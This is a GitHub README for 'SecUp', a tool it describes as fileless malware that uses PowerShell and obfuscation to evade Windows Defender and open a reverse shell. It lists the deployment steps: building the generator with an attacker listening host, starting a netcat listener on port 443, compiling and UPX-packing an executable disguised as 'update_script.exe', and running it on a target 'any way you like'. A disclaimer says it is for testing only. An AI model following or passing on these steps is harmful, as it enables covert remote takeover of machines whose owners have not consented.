# SecUp "Malware for Learning"

!!! FOR SECURITY TESTING PURPOSES ONLY !!! <br>
\******************************************************<br>
DO NOT USE THIS ON SYSTEMS THAT YOU DO NOT <br>
OWN UNLESS YOU HAVE EXPRESS PERMISSION !!!

Fileless malware that bypasses Windows Defender using PowerShell and obfuscation. <br>
Just a simple Reverse Shell using a batch script to kick things off, after which everything is fileless.

YouTube video demonstration and explanation >>> https://youtu.be/BFVzmZXIbQk

Setup is simple.<br>
1. Clone this repo<br>
`git clone https://github.com/daniellowrie/update_script`
2. Build `SecUp.go`<br>
`go build SecUp.go`
3. From terminal, run: ./SecUp <LHOST><br>
`dlowrie@kali:~/Tools/update_script$ ./SecUp 192.168.1.200`
4. Open another terminal, and start a Listener on port 443 (sudo if not root)<br>
`sudo nc -vnlp 443`
5. Compile EXE<br>
`GOOS=windows go build -ldflags "-s -w" -trimpath update_script.go`<br>
`upx -9 update_script.exe`
6. Back at the SecUp terminal<br>
`Press ENTER to continue...`
7. Upload and execute `update_script.exe` to target any way you like<br>
8. Shellz! :)
<P></P>
<P></P>
Going to work on building a better mousetrap as this was just a PoC at making something 'malicious' that could bypass Defender.
<P></P>



https://user-images.githubusercontent.com/19762230/132001237-04ae01ae-102e-4070-9599-ad05128c3f73.mp4


